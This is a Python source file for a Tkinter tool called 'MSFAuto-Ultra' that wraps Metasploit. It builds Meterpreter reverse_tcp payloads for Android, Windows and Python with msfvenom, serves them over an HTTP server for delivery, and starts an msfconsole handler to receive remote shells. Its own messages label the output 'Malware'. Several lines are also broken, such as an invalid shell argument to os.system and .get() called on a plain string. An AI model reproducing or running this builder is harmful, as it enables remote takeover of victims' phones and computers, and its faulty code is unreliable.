from tkinter import * 
from tkinter import messagebox as msg
from colorama import Fore, Back, Style, init
import platform, os, random, time, subprocess, webbrowser
init(autoreset=True)
class msfauto_ultra():
    def __init__(self, app_name, ip, port_one, port_two, payload):
        self.app_name = app_name
        self.ip = ip
        self.port1 = port_one
        self.port2 = port_two
        self.payload = payload
        if self.payload == "android": self.payload = "android/meterpreter/reverse_tcp"
        elif self.payload == "mac": self.payload = "python/meterpreter/reverse_tcp"
        else: self.payload = "windows/meterpreter/reverse_tcp"
    def create_malware(self): 
        create_output_folder()
        if self.payload == "android/meterpreter/reverse_tcp": os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} R > {self.app_name}.apk")
        elif self.payload == "python/meterpreter/reverse_tcp": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
        else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} -f exe > Output/{self.app_name}.exe")
        os.system(self.payload)
        print(Fore.GREEN + "Malware created. continue...")
    def craete_http_server(self):
        create_output_folder()
        os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
        print(Fore.RED + "You closed http server.")
    def return_links(self):  
        webbrowser.open(f"https://{self.ip}:{self.port2}/")
        return f"\nDocument address:\nhttps://{self.ip}:{self.port2}/"
    def start_msfconsole(self):
        print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
    def start_together(self):
        command1 = f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"
        server = subprocess.Popen(command1, shell=True)
        command2 = f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"'
        msf = subprocess.Popen(command2, shell=True)
        server.wait()
        msf.wait()
def banner():
    banners = {
        1 : f"""{Fore.CYAN}
  \/________________                                                                                                              
 /     _____________)                                                                                                            
/     /      _  _ |                                                                                                              
\/\/\/     (O) (O)|                                                                                                              
  |           ------,                                                                                                            
  |  _       ______/        ___________________________________________________                                                  
  | (_      /   \  \       /                                                  /___________________________________________       
  |        /  ___\_ \     /  ░▒█▀▄▀█░▒█▀▀▀█░▒█▀▀▀░░░▒█░▒█░█░░▀█▀░█▀▀▄░█▀▀▄   /                                             \     
  |        \      / /     \  ░▒█▒█▒█░░▀▀▀▄▄░▒█▀▀░░░░▒█░▒█░█░░░█░░█▄▄▀░█▄▄█  / (https://github.com/Unknow-Per/msfauto-ultra) \    
__|_________\______/      /  ░▒█░░▒█░▒█▄▄▄█░▒█░░░░░░░▀▄▄▀░▀▀░░▀░░▀░▀▀░▀░░▀ /  (by Unknow-Per)                               /    
\______________\./__\     \_______________________________________________/________________________________________________/     
 /     .       | \  |                                                                                                            
 \    /_\   .  |  \ |\                                                                                                           
 |`\       /_\ |   \| \                                                                                                          
""",
        2 : f"""{Fore.CYAN}                                  ___
    .    _  .     _____________  /   \_______________________________________________
    |\_|/__/|    /             \/                                                   /
   / / \/ \  \  /    This is    \  (https://github.com/Unknow-Per/msfauto-ultra)   /
  /__|O||O|__ \ \ MSFAuto-Ultra /   (by Unknow-Per)                _______________/
 |/_ \_/\_/ _\ | \  ___________/__________________________________/
 | | (____) | ||  |/
 \/\___/\__/  // _/
 (_/         ||
  |          ||\ 
   \        //_/ 
    \______//
   __|| __||
  (____(____)
 
""",
        3 : f"""{Fore.CYAN}
        .--'''''''''--.
     .'      .---.      '.
    /    .-----------.    \         ___________________
   /        .-----.        \       /                   \ 
   |       .-.   .-.       |      /  Ohh... Im again?   \ 
   |      /   \ /   \      |     /   Ok,  THIS IS        \ 
    \    | .-. | .-. |    /     /                        /
     '-._| | | | | | |_.-'     /      MSFAuto           /
         | '-' | '-' |         \             Ultra     /
          \___/ \___/           \  ___________________/
       _.-'  /   \  `-._         |/
     .' _.--|     |--._ '.     __/
     ' _...-|     |-..._ '
            |     |
            '.___.'
""",
        4 : f"""{Fore.CYAN}
• ▌ ▄ ·. .▄▄ · ·▄▄▄ ▄▄▄· ▄• ▄▌▄▄▄▄▄        ▄• ▄▌▄▄▌  ▄▄▄▄▄▄▄▄   ▄▄▄· 
·██ ▐███▪▐█ ▀. ▐▄▄·▐█ ▀█ █▪██▌•██   ▄█▀▄   █▪██▌██•  •██  ▀▄ █·▐█ ▀█ 
▐█ ▌▐▌▐█·▄▀▀▀█▄██▪ ▄█▀▀█ █▌▐█▌ ▐█.▪▐█▌.▐▌  █▌▐█▌██▪   ▐█.▪▐▀▀▄ ▄█▀▀█ 
██ ██▌▐█▌▐█▄▪▐███▌.▐█ ▪▐▌▐█▄█▌ ▐█▌·▐█▌.▐▌  ▐█▄█▌▐█▌▐▌ ▐█▌·▐█•█▌▐█ ▪▐▌
▀▀  █▪▀▀▀ ▀▀▀▀ ▀▀▀  ▀  ▀  ▀▀▀  ▀▀▀  ▀█▄▀▪   ▀▀▀ .▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀ 
""",
        5 : f"""{Fore.CYAN}
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░░░░░░░░░░░░░▄░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▐▒░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▐
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▌▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▌
"""
    }
    print(banners[random.randint(1, 5)])
def clear(): os.system("clear")
def create_output_folder():
    try: os.mkdir("Output")
    except FileExistsError: pass
def check_os():
    if platform.uname()[0] != "Linux": print(Fore.RED + Style.BRIGHT + "[-] Your platform must be Kali Linux."), exit()
    else: print(Fore.GREEN + Style.BRIGHT + "[+] OS Accepted! Continue...")
    time.sleep(5)
    clear()
def get_info():
    root = Tk()
    Label(root, text="your application's name:").place(x=15, y=27)
    Label(root, text="your ip:").place(x=15, y=97)
    Label(root, text="your first port:").place(x=15, y=147)
    Label(root, text="your payload:").place(x=15, y=207)
    Label(root, text="(android, windows, or mac)").place(x=15, y=235)
    app_name = Entry(root, width=50)
    ip = Entry(root, width=50)
    port1 = Entry(root, width=50)
    port2 = "8080"
    payload = Entry(root, width=50)
    app_name.place(x=150, y=50)
    ip.place(x=150, y=100)
    port1.place(x=150, y=150)
    payload.place(x=150, y=207)
    def save():
        with open("config", "w") as writer:
            writer.write(f"{app_name.get()},{ip.get()},{port1.get()},{port2.get()},{payload.get()}")
            root.destroy()
            msg.showinfo("Completed", "Geting data is completed.")
    Button(root, command=save, text="submit", width=8, height=2).place(x=550, y=150)
    root.geometry("700x350")
    root.title("Get informations")
    root.resizable(True, True)
    root.mainloop()
def read_info():
    with open("config", "r") as read:
        reader = read.readlines()
        reader = "".join(reader)
        reader = reader.split(",")
    msfultra = msfauto_ultra(app_name=reader[0], ip=reader[1], port_one=reader[2], port_two=reader[3], payload=reader[4])
    return msfultra
def mainapp():
    msfultra = read_info()
    msfultra.create_malware()
    msg.showinfo("Malware created", "Malware is creted complete")
    time.sleep(5)
    msg.showinfo("Links", msfultra.return_links())
    msfultra.start_together()